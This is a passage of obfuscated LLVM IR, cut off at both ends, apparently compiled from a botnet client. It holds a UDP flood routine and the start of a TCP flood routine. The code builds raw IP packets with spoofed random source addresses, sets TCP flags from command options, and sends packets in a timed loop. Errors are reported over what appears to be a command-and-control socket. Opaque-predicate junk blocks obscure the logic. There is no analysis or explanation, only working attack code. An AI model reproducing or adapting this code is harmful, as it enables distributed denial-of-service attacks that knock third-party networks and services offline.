  %280 = bitcast %union.anon.3* %279 to %struct.anon.4*
  %281 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %280, i32 0, i32 2
  store i16 %277, i16* %281, align 2
  %282 = call i32 @rand_cmwc()
  %283 = trunc i32 %282 to i16
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 0
  %286 = bitcast %union.anon.3* %285 to %struct.anon.4*
  %287 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %286, i32 0, i32 0
  store i16 %283, i16* %287, align 2
  %288 = load i32, i32* %8, align 4
  %289 = icmp eq i32 %288, 0
  br i1 %289, label %290, label %292

; <label>:290:                                    ; preds = %251
  %291 = call i32 @rand_cmwc()
  br label %313

; <label>:292:                                    ; preds = %251
  %293 = load i32, i32* @x.67
  %294 = load i32, i32* @y.68
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %292
  %301 = load i32, i32* %8, align 4
  %302 = trunc i32 %301 to i16
  %303 = call zeroext i16 @htons(i16 zeroext %302) #13
  %304 = zext i16 %303 to i32
  %305 = load i32, i32* @x.67
  %306 = load i32, i32* @y.68
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %313

; <label>:313:                                    ; preds = %originalBBpart231, %290
  %314 = phi i32 [ %291, %290 ], [ %304, %originalBBpart231 ]
  %315 = trunc i32 %314 to i16
  %316 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon.3* %317 to %struct.anon.4*
  %319 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %318, i32 0, i32 1
  store i16 %315, i16* %319, align 2
  %320 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon.3* %321 to %struct.anon.4*
  %323 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %322, i32 0, i32 3
  store i16 0, i16* %323, align 2
  %324 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %325 = bitcast %struct.udphdr* %324 to i8*
  %326 = getelementptr inbounds i8, i8* %325, i64 8
  %327 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %326, i32 %327)
  %328 = bitcast i8* %256 to i16*
  %329 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 2
  %331 = load i16, i16* %330, align 2
  %332 = zext i16 %331 to i32
  %333 = call zeroext i16 @csum(i16* %328, i32 %332)
  %334 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 7
  store i16 %333, i16* %335, align 2
  %336 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %337 = load i32, i32* %9, align 4
  %338 = add nsw i32 %336, %337
  store i32 %338, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %339

; <label>:339:                                    ; preds = %originalBBpart249, %423, %313
  br label %340

; <label>:340:                                    ; preds = %339
  %341 = load i32, i32* @x.67
  %342 = load i32, i32* @y.68
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %340
  %349 = load i32, i32* %19, align 4
  %350 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %351 = call i64 @sendto(i32 %349, i8* %256, i64 %254, i32 0, %struct.sockaddr* %350, i32 16)
  %352 = call i32 @rand_cmwc()
  %353 = trunc i32 %352 to i16
  %354 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %355 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %354, i32 0, i32 0
  %356 = bitcast %union.anon.3* %355 to %struct.anon.4*
  %357 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %356, i32 0, i32 0
  store i16 %353, i16* %357, align 2
  %358 = load i32, i32* %8, align 4
  %359 = icmp eq i32 %358, 0
  %360 = load i32, i32* @x.67
  %361 = load i32, i32* @y.68
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %359, label %368, label %370

; <label>:368:                                    ; preds = %originalBBpart235
  %369 = call i32 @rand_cmwc()
  br label %391

; <label>:370:                                    ; preds = %originalBBpart235
  %371 = load i32, i32* @x.67
  %372 = load i32, i32* @y.68
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %370
  %379 = load i32, i32* %8, align 4
  %380 = trunc i32 %379 to i16
  %381 = call zeroext i16 @htons(i16 zeroext %380) #13
  %382 = zext i16 %381 to i32
  %383 = load i32, i32* @x.67
  %384 = load i32, i32* @y.68
  %385 = sub i32 %383, 1
  %386 = mul i32 %383, %385
  %387 = urem i32 %386, 2
  %388 = icmp eq i32 %387, 0
  %389 = icmp slt i32 %384, 10
  %390 = or i1 %388, %389
  br i1 %390, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %391

; <label>:391:                                    ; preds = %originalBBpart239, %368
  %392 = phi i32 [ %369, %368 ], [ %382, %originalBBpart239 ]
  %393 = trunc i32 %392 to i16
  %394 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon.3* %395 to %struct.anon.4*
  %397 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %396, i32 0, i32 1
  store i16 %393, i16* %397, align 2
  %398 = call i32 @rand_cmwc()
  %399 = trunc i32 %398 to i16
  %400 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 3
  store i16 %399, i16* %401, align 4
  %402 = load i32, i32* %22, align 4
  %403 = call i32 @getRandomIP(i32 %402)
  %404 = call i32 @htonl(i32 %403) #13
  %405 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %406 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %405, i32 0, i32 8
  store i32 %404, i32* %406, align 4
  %407 = bitcast i8* %256 to i16*
  %408 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 2
  %410 = load i16, i16* %409, align 2
  %411 = zext i16 %410 to i32
  %412 = call zeroext i16 @csum(i16* %407, i32 %411)
  %413 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 7
  store i16 %412, i16* %414, align 2
  %415 = load i32, i32* %27, align 4
  %416 = load i32, i32* %14, align 4
  %417 = icmp eq i32 %415, %416
  br i1 %417, label %418, label %424

; <label>:418:                                    ; preds = %391
  %419 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %420 = load i32, i32* %26, align 4
  %421 = icmp sgt i32 %419, %420
  br i1 %421, label %422, label %423

; <label>:422:                                    ; preds = %418
  br label %443

; <label>:423:                                    ; preds = %418
  store i32 0, i32* %27, align 4
  br label %339

; <label>:424:                                    ; preds = %391
  %425 = load i32, i32* @x.67
  %426 = load i32, i32* @y.68
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %424
  %433 = load i32, i32* %27, align 4
  %434 = add i32 %433, 1
  store i32 %434, i32* %27, align 4
  %435 = load i32, i32* @x.67
  %436 = load i32, i32* @y.68
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart249, label %originalBB41alteredBB

originalBBpart249:                                ; preds = %originalBB41
  br label %339

; <label>:443:                                    ; preds = %422
  %444 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %444)
  br label %445

; <label>:445:                                    ; preds = %443, %originalBBpart227, %originalBBpart219, %167, %114, %originalBBpart24, %45
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %52
  %446 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %446, i32* %15, align 4
  %447 = load i32, i32* %15, align 4
  %448 = icmp ne i32 %447, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %449 = load i32, i32* @mainCommSock, align 4
  %450 = call i32 (i32, i8*, ...) @sockprintf(i32 %449, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %451 = load i32, i32* %11, align 4
  %_ = sub i32 0, %451
  %gen = add i32 %_, 1
  %_7 = sub i32 %451, 1
  %gen8 = mul i32 %_7, 1
  %_9 = shl i32 %451, 1
  %452 = add nsw i32 %451, 1
  %453 = sext i32 %452 to i64
  %454 = call noalias i8* @malloc(i64 %453) #2
  store i8* %454, i8** %16, align 8
  %455 = load i8*, i8** %16, align 8
  %456 = icmp eq i8* %455, null
  br label %originalBB6

originalBB13alteredBB:                            ; preds = %originalBB13, %125
  %457 = load i32, i32* %15, align 4
  %458 = load i8*, i8** %16, align 8
  %459 = load i32, i32* %11, align 4
  %460 = sext i32 %459 to i64
  %461 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %462 = call i64 @sendto(i32 %457, i8* %458, i64 %460, i32 0, %struct.sockaddr* %461, i32 16)
  %463 = load i32, i32* %18, align 4
  %464 = load i32, i32* %14, align 4
  %465 = icmp eq i32 %463, %464
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %172
  %466 = load i32, i32* @mainCommSock, align 4
  %467 = call i32 (i32, i8*, ...) @sockprintf(i32 %466, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %191
  store i32 1, i32* %20, align 4
  %468 = load i32, i32* %19, align 4
  %469 = bitcast i32* %20 to i8*
  %470 = call i32 @setsockopt(i32 %468, i32 0, i32 3, i8* %469, i32 4) #2
  %471 = icmp slt i32 %470, 0
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %212
  %472 = load i32, i32* @mainCommSock, align 4
  %473 = call i32 (i32, i8*, ...) @sockprintf(i32 %472, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %292
  %474 = load i32, i32* %8, align 4
  %475 = trunc i32 %474 to i16
  %476 = call zeroext i16 @htons(i16 zeroext %475) #13
  %477 = zext i16 %476 to i32
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %340
  %478 = load i32, i32* %19, align 4
  %479 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %480 = call i64 @sendto(i32 %478, i8* %256, i64 %254, i32 0, %struct.sockaddr* %479, i32 16)
  %481 = call i32 @rand_cmwc()
  %482 = trunc i32 %481 to i16
  %483 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %484 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %483, i32 0, i32 0
  %485 = bitcast %union.anon.3* %484 to %struct.anon.4*
  %486 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %485, i32 0, i32 0
  store i16 %482, i16* %486, align 2
  %487 = load i32, i32* %8, align 4
  %488 = icmp eq i32 %487, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %370
  %489 = load i32, i32* %8, align 4
  %490 = trunc i32 %489 to i16
  %491 = call zeroext i16 @htons(i16 zeroext %490) #13
  %492 = zext i16 %491 to i32
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %424
  %493 = load i32, i32* %27, align 4
  %_42 = shl i32 %493, 1
  %_43 = sub i32 %493, 1
  %gen44 = mul i32 %_43, 1
  %_45 = sub i32 0, %493
  %gen46 = add i32 %_45, 1
  %_47 = shl i32 %493, 1
  %494 = add i32 %493, 1
  store i32 %494, i32* %27, align 4
  br label %originalBB41
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %50

; <label>:30:                                     ; preds = %7
  %31 = load i32, i32* @x.69
  %32 = load i32, i32* @y.70
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  %42 = load i32, i32* @x.69
  %43 = load i32, i32* @y.70
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %71

; <label>:50:                                     ; preds = %7
  %51 = load i32, i32* @x.69
  %52 = load i32, i32* @y.70
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = load i32, i32* %9, align 4
  %60 = trunc i32 %59 to i16
  %61 = call zeroext i16 @htons(i16 zeroext %60) #13
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %61, i16* %62, align 2
  %63 = load i32, i32* @x.69
  %64 = load i32, i32* @y.70
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:71:                                     ; preds = %originalBBpart24, %originalBBpart2
  %72 = load i8*, i8** %8, align 8
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %74 = call i32 @getHost(i8* %72, %struct.in_addr* %73)
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %71
  br label %499

; <label>:77:                                     ; preds = %71
  %78 = load i32, i32* @x.69
  %79 = load i32, i32* @y.70
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %87 = getelementptr inbounds [8 x i8], [8 x i8]* %86, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %87, i8 0, i64 8, i32 4, i1 false)
  %88 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %88, i32* %17, align 4
  %89 = load i32, i32* %17, align 4
  %90 = icmp ne i32 %89, 0
  %91 = load i32, i32* @x.69
  %92 = load i32, i32* @y.70
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %90, label %102, label %99

; <label>:99:                                     ; preds = %originalBBpart28
  %100 = load i32, i32* @mainCommSock, align 4
  %101 = call i32 (i32, i8*, ...) @sockprintf(i32 %100, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  br label %499

; <label>:102:                                    ; preds = %originalBBpart28
  store i32 1, i32* %18, align 4
  %103 = load i32, i32* %17, align 4
  %104 = bitcast i32* %18 to i8*
  %105 = call i32 @setsockopt(i32 %103, i32 0, i32 3, i8* %104, i32 4) #2
  %106 = icmp slt i32 %105, 0
  br i1 %106, label %107, label %110

; <label>:107:                                    ; preds = %102
  %108 = load i32, i32* @mainCommSock, align 4
  %109 = call i32 (i32, i8*, ...) @sockprintf(i32 %108, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  br label %499

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* @x.69
  %112 = load i32, i32* @y.70
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %110
  %119 = load i32, i32* %11, align 4
  %120 = icmp eq i32 %119, 0
  %121 = load i32, i32* @x.69
  %122 = load i32, i32* @y.70
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %120, label %129, label %130

; <label>:129:                                    ; preds = %originalBBpart212
  store i32 0, i32* %19, align 4
  br label %136

; <label>:130:                                    ; preds = %originalBBpart212
  %131 = load i32, i32* %11, align 4
  %132 = sub nsw i32 32, %131
  %133 = shl i32 1, %132
  %134 = sub nsw i32 %133, 1
  %135 = xor i32 %134, -1
  store i32 %135, i32* %19, align 4
  br label %136

; <label>:136:                                    ; preds = %130, %129
  %137 = load i32, i32* %13, align 4
  %138 = sext i32 %137 to i64
  %139 = add i64 40, %138
  %140 = call i8* @llvm.stacksave()
  store i8* %140, i8** %20, align 8
  %141 = alloca i8, i64 %139, align 16
  %142 = bitcast i8* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %21, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = getelementptr i8, i8* %144, i64 20
  %146 = bitcast i8* %145 to %struct.tcphdr*
  store %struct.tcphdr* %146, %struct.tcphdr** %22, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %149 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %148, i32 0, i32 0
  %150 = load i32, i32* %149, align 4
  %151 = load i32, i32* %19, align 4
  %152 = call i32 @getRandomIP(i32 %151)
  %153 = call i32 @htonl(i32 %152) #13
  %154 = load i32, i32* %13, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 20, %155
  %157 = trunc i64 %156 to i32
  call void @makeIPPacket(%struct.iphdr* %147, i32 %150, i32 %153, i8 zeroext 6, i32 %157)
  %158 = call i32 @rand_cmwc()
  %159 = trunc i32 %158 to i16
  %160 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %161 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %160, i32 0, i32 0
  %162 = bitcast %union.anon.0* %161 to %struct.anon.1*
  %163 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %162, i32 0, i32 0
  store i16 %159, i16* %163, align 4
  %164 = call i32 @rand_cmwc()
  %165 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %166 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %165, i32 0, i32 0
  %167 = bitcast %union.anon.0* %166 to %struct.anon.1*
  %168 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %167, i32 0, i32 2
  store i32 %164, i32* %168, align 4
  %169 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon.0* %170 to %struct.anon.1*
  %172 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %171, i32 0, i32 3
  store i32 0, i32* %172, align 4
  %173 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon.0* %174 to %struct.anon.1*
  %176 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %175, i32 0, i32 4
  %177 = load i16, i16* %176, align 4
  %178 = and i16 %177, -241
  %179 = or i16 %178, 80
  store i16 %179, i16* %176, align 4
  %180 = load i8*, i8** %12, align 8
  %181 = call i32 @strcmp(i8* %180, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %219, label %183

; <label>:183:                                    ; preds = %136
  %184 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.0* %185 to %struct.anon.1*
  %187 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %186, i32 0, i32 4
  %188 = load i16, i16* %187, align 4
  %189 = and i16 %188, -513
  %190 = or i16 %189, 512
  store i16 %190, i16* %187, align 4
  %191 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon.0* %192 to %struct.anon.1*
  %194 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -1025
  %197 = or i16 %196, 1024
  store i16 %197, i16* %194, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.0* %199 to %struct.anon.1*
  %201 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -257
  %204 = or i16 %203, 256
  store i16 %204, i16* %201, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.0* %206 to %struct.anon.1*
  %208 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %209, -4097
  %211 = or i16 %210, 4096
  store i16 %211, i16* %208, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 0
  %214 = bitcast %union.anon.0* %213 to %struct.anon.1*
  %215 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = and i16 %216, -2049
  %218 = or i16 %217, 2048
  store i16 %218, i16* %215, align 4
  br label %392

; <label>:219:                                    ; preds = %136
  %220 = load i8*, i8** %12, align 8
  %221 = call i8* @strtok(i8* %220, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %221, i8** %23, align 8
  br label %222

; <label>:222:                                    ; preds = %373, %219
  %223 = load i8*, i8** %23, align 8
  %224 = icmp ne i8* %223, null
  br i1 %224, label %225, label %375

; <label>:225:                                    ; preds = %222
  %226 = load i32, i32* @x.69
  %227 = load i32, i32* @y.70
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %225
  %234 = load i8*, i8** %23, align 8
  %235 = call i32 @strcmp(i8* %234, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i32 0, i32 0)) #10
  %236 = icmp ne i32 %235, 0
  %237 = load i32, i32* @x.69
  %238 = load i32, i32* @y.70
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %236, label %253, label %245

; <label>:245:                                    ; preds = %originalBBpart216
  %246 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon.0* %247 to %struct.anon.1*
  %249 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %250, -513
  %252 = or i16 %251, 512
  store i16 %252, i16* %249, align 4
  br label %373

; <label>:253:                                    ; preds = %originalBBpart216
  %254 = load i8*, i8** %23, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i32 0, i32 0)) #10
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %265, label %257

; <label>:257:                                    ; preds = %253
  %258 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.0* %259 to %struct.anon.1*
  %261 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -1025
  %264 = or i16 %263, 1024
  store i16 %264, i16* %261, align 4
  br label %372

; <label>:265:                                    ; preds = %253
  %266 = load i8*, i8** %23, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.51, i32 0, i32 0)) #10
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %277, label %269

; <label>:269:                                    ; preds = %265
  %270 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 0
